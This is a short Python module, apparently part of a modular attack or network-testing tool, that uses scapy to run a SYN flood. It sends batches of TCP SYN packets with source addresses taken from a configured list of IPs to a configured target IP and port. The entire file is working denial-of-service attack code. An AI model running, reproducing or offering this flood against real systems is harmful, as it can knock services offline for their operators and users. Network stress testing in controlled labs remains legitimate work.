from scapy.all import IP, TCP, send
from tqdm import tqdm
import time
from config import TARGET_IP, DEFAULT_TARGET_PORT, SRC_IP_LIST, DEFAULT_INTERVAL

NAME = "SYN Flood"

PACKET_COUNT = 3000
BATCH_SIZE = 500


def run():

    print(f"\n[{NAME}]")

    packet = (IP(src=SRC_IP_LIST, dst=TARGET_IP) / TCP(dport=DEFAULT_TARGET_PORT, flags="S"))

    for _ in tqdm(range(PACKET_COUNT // BATCH_SIZE), desc=NAME,):
        send(packet, count=BATCH_SIZE, verbose=False)

        if DEFAULT_INTERVAL > 0:
            time.sleep(DEFAULT_INTERVAL)